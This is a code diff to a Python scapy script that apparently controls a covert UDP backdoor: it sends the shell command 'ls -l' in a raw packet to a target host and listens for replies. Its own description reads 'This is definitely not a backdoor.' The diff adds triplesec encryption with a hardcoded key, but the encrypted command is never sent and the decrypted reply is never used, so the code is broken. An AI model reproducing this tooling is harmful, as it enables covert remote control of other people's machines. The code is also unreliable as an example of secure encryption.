@@ -1,8 +1,10 @@
 from scapy.all import *
 import argparse
+import triplesec
 
 def packetFunc(packet):
-  print packet.load
+  encryptedData = packet.load
+  data = triplesec.decrypt(encryptedData, b'key yo').decode()
 
 
 parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
@@ -24,6 +26,7 @@ parser.add_argument('-ip'
 args = parser.parse_args()
 
 command = "ls -l"
+encryptedCommand = triplesec.encrypt(command, b'key yo')
 sniffFilter = 'udp and dst port {0} and src port {1}' .format(args.sourcePort, args.destPort)
 packet = IP(dst=args.destIP)/UDP(dport=int(args.destPort), sport=int(args.sourcePort))/Raw(load=command)
 send(packet)
